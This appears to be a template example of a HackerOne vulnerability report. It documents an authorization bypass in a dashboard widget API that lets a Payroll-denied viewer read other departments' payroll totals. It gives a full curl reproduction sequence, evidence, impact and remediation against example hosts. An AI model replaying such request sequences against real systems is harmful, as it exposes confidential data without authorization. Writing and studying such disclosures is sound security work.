---
description: "Example: HackerOne submission for an authorization bypass where a shared dashboard widget's query override runs under the creator's permission instead of the viewer's"
skill: report-generation
category: Disclosure & Reporting Formats
---

**Title:** Widget query override lets a Payroll-denied dashboard viewer read Payroll data

**Weakness:** CWE-863: Incorrect Authorization

**Severity:** MEDIUM

**CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (4.3)

**Asset:** GET https://home.meridianops.example/api/dashboard-widgets/{widget_id}/data
**Pass if:** step 11 returns department `executive` with a total and `calculated_at` that differ from step 7's engineering read, and step 4 returns status `error` naming the widget's own creator

---

### Summary

A Meridian Ops user the organization denies Payroll access runs their own Payroll query through a colleague's shared dashboard widget. I hold no Payroll role and I'm refused at Payroll's own API. A `params` override on the widget-data route still returns a live computation for a department the widget's creator never configured. The route authorizes on the widget's stored creator, not the requester, and never re-checks an override's target against anyone's permission.

**Exploit flow**
1. A Payroll admin creates a dashboard widget scoped to one department and shares the dashboard with an ordinary viewer.
2. The viewer, who holds no Payroll access, fetches the shared widget once as configured and gets the admin's own department total.
3. The viewer replays the same request with a `params` override naming a different department.
4. The widget-data route re-runs the Payroll query under the creator's authority instead of the viewer's, with no check that the creator authorized this specific override.
5. The response carries a fresh computation for whichever department the viewer named, not the one the creator configured.

### Steps to Reproduce

1. [attacker] Confirm the Viewer account holds no Payroll role, reading Viewer's own permission record as Admin.
```
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  https://payroll.meridianops.example/api/permissions/$VIEWER_ID
```
**Expect:** `{"payroll_access": "none"}`.
2. [attacker] Confirm Viewer is refused directly at Payroll's own API, using Viewer's session.
```
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $VIEWER_TOKEN" \
  "https://payroll.meridianops.example/api/payroll/summary?department=engineering"
```
**Expect:** 403.
3. [attacker] As Viewer, create a dashboard and add a Payroll widget, so the widget's own creator is the Viewer.
```
DASH_V=$(curl -s -X POST -H "Authorization: Bearer $VIEWER_TOKEN" -H "Content-Type: application/json" \
  -d '{}' https://home.meridianops.example/api/dashboards | jq -r .id)
WIDGET_V=$(curl -s -X POST -H "Authorization: Bearer $VIEWER_TOKEN" -H "Content-Type: application/json" \
  -d '{"widget_type":"payroll_department_total","params":{"department":"engineering"}}' \
  https://home.meridianops.example/api/dashboards/$DASH_V/widgets | jq -r .id)
```
**Expect:** 201 on both.
4. [attacker] As Viewer, poll that widget's data until it settles.
```
curl -s -H "Authorization: Bearer $VIEWER_TOKEN" \
  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_V/data
```
**Expect:** `status: "error"`, naming Viewer as the creator lacking Payroll access.
5. [attacker] As Admin, seed a real payroll batch for the Engineering department.
```
curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"department":"engineering","period":"2026-07","total_cents":84230000}' \
  https://payroll.meridianops.example/api/payroll/batches
```
**Expect:** 201, `total_cents: 84230000`.
6. [attacker] As Admin, create a dashboard and add a Payroll widget scoped to Engineering.
```
DASH_A=$(curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{}' https://home.meridianops.example/api/dashboards | jq -r .id)
WIDGET_A=$(curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"widget_type":"payroll_department_total","params":{"department":"engineering"}}' \
  https://home.meridianops.example/api/dashboards/$DASH_A/widgets | jq -r .id)
```
**Expect:** 201 on both.
7. [attacker] As Admin, poll until status is ok, then read the widget's stored configuration before any override.
```
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_A/data
```
**Expect:** `status: "ok"`, `department: "engineering"`, `total_cents: 84230000`.
8. [attacker] Before sharing anything, as Viewer, fetch that widget by id.
```
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $VIEWER_TOKEN" \
  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_A/data
```
**Expect:** 404.
9. [attacker] As Admin, share the dashboard with Viewer as a viewer collaborator.
```
curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d "{\"person_id\":\"$VIEWER_ID\",\"role\":\"viewer\"}" \
  https://home.meridianops.example/api/dashboards/$DASH_A/collaborators
```
**Expect:** 201.
10. [attacker] As Viewer, fetch the shared widget as-is, with no override.
```
curl -s -H "Authorization: Bearer $VIEWER_TOKEN" \
  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_A/data
```
**Expect:** `status: "ok"`, `department: "engineering"`, `total_cents: 84230000` — the creator's own configured view.
11. [attacker] As Viewer, repeat that request with a `params` override naming a department the widget was never configured for.
```
curl -s -G -H "Authorization: Bearer $VIEWER_TOKEN" \
  --data-urlencode 'params={"department":"executive"}' \
  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_A/data
```
**Expect:** `status: "ok"`, `department: "executive"`, a new `calculated_at`, a total Viewer has no other way to see.
12. [attacker] As Admin, seed a second payroll batch and widget scoped to Sales, and share that dashboard too.
```
curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"department":"sales","period":"2026-07","total_cents":51900000}' \
  https://payroll.meridianops.example/api/payroll/batches
DASH_A2=$(curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{}' https://home.meridianops.example/api/dashboards | jq -r .id)
WIDGET_A2=$(curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"widget_type":"payroll_department_total","params":{"department":"sales"}}' \
  https://home.meridianops.example/api/dashboards/$DASH_A2/widgets | jq -r .id)
curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d "{\"person_id\":\"$VIEWER_ID\",\"role\":\"viewer\"}" \
  https://home.meridianops.example/api/dashboards/$DASH_A2/collaborators
```
**Expect:** 201 on the batch, both widget creates, and the share.
13. [attacker] As Viewer, override the second widget's params to a third department neither widget was configured for.
```
curl -s -G -H "Authorization: Bearer $VIEWER_TOKEN" \
  --data-urlencode 'params={"department":"finance"}' \
  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_A2/data
```
**Expect:** `status: "ok"`, `department: "finance"`, a live total.
14. [attacker] As Viewer, confirm still refused directly at Payroll's own API.
```
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $VIEWER_TOKEN" \
  "https://payroll.meridianops.example/api/payroll/summary?department=finance"
```
**Expect:** 403, unchanged from step 2.
15. [attacker] As Viewer, attempt to persist the override into the widget's own stored configuration instead of a per-request param.
```
curl -s -o /dev/null -w '%{http_code}\n' -X PATCH -H "Authorization: Bearer $VIEWER_TOKEN" -H "Content-Type: application/json" \
  -d '{"params":{"department":"executive"}}' \
  https://home.meridianops.example/api/dashboards/$DASH_A/widgets/$WIDGET_A
```
**Expect:** 403 — Viewer cannot modify Admin's widget, only override a single read of it.
16. [attacker] As Admin, delete both dashboards and both payroll batches.
```
curl -s -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" https://home.meridianops.example/api/dashboards/$DASH_V
curl -s -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" https://home.meridianops.example/api/dashboards/$DASH_A
curl -s -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" https://home.meridianops.example/api/dashboards/$DASH_A2
curl -s -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" "https://payroll.meridianops.example/api/payroll/batches?period=2026-07"
```
**Expect:** 204 on each; re-running step 8 on either widget then returns 404, and both departments' payroll totals return to zero.

### Evidence

**1. Override drives a fresh live query, not a cached replay.** Step 7 (admin, no override) against step 11 (viewer, override), same widget:
```
admin, no override (step 7):
  department: "engineering", total_cents: 84230000, calculated_at: "2026-07-14T16:02:11Z"

viewer, override (step 11):
  department: "executive",  total_cents: 29175000, calculated_at: "2026-07-14T16:09:47Z"   <-- later, different department, fresh compute
```
Different department, different total, later `calculated_at` — the viewer's own query parameter drove a new Payroll computation, not a replay of the creator's cached view.

**2. Root cause: the check names the creator, not the requester.** Step 4's response, from a widget Viewer created themselves:
```
{"status": "error", "error": "The creator of this widget (Alex Rivera) no longer has Payroll access."}   <-- proof: the check runs against the CREATOR field
```
Alex Rivera is Viewer. Same route, same identity as requester; the only thing that changed between step 4 and step 11 is who created the widget being read. When Viewer is both creator and requester, the check correctly refuses them. When Admin is the creator and Viewer only holds a share, the same check passes on Admin's authority. It never re-evaluates the override's own target against anyone's permission.

**3. The primitive generalizes past one widget.** Step 13 repeats the override on a second, independently created widget and a third department:
```
widget 1 (creator: Admin, configured: engineering)  -> override department=executive -> ok, live total
widget 2 (creator: Admin, configured: sales)         -> override department=finance   -> ok, live total
```
Two widgets, two configured departments, two override targets — the exposure isn't one misconfigured widget, it's the route's authorization model.

**4. Minimum privilege and reachability.** Steps 2 and 14, bracketing the whole exploit, both return 403 from Payroll's own API under Viewer's session. Viewer's own credentials never gained Payroll access anywhere else. Step 8 returns 404 before the share exists, so this isn't a flat by-id IDOR. The widget becomes reachable only once collaboration is granted, and only the override turns that reachability into an unbounded query.

**5. Read-only, not persistent.** Step 15's attempt to write the override into the widget's own stored configuration is refused with the same 403 Viewer gets from Payroll directly. The exposure is confined to whatever a single per-request override returns in that response. It doesn't durably change what the widget shows Admin or other viewers, and Viewer gains no path to Payroll beyond this one read.

### Attack Scenario

Adding a viewer to a shared dashboard is a common default when teams collaborate on reporting. That viewer widens any Payroll widget on it to any department by editing one query parameter. No special tooling is needed, only the same request the dashboard's own UI already sends, with a different value.

### Impact

A Payroll-denied viewer reads any department's totals by editing one query parameter on a shared widget, not just the department its creator configured. The exposure covers every department the organization runs payroll for, and needs nothing beyond an existing dashboard share.

### Remediation

1. Re-authorize every widget-data request, including `params` overrides, against the requesting user's own Payroll permission, not the stored creator's. An override that changes what gets queried is a new authorization decision, not a re-read of an already-approved one. Drop the `params` override entirely, and move department/timeframe scoping into the widget's own stored configuration, set once by whoever is authorized to set it.
2. As defense-in-depth, log every request whose effective query differs from the stored configuration, so an override like this surfaces before a client reports it.
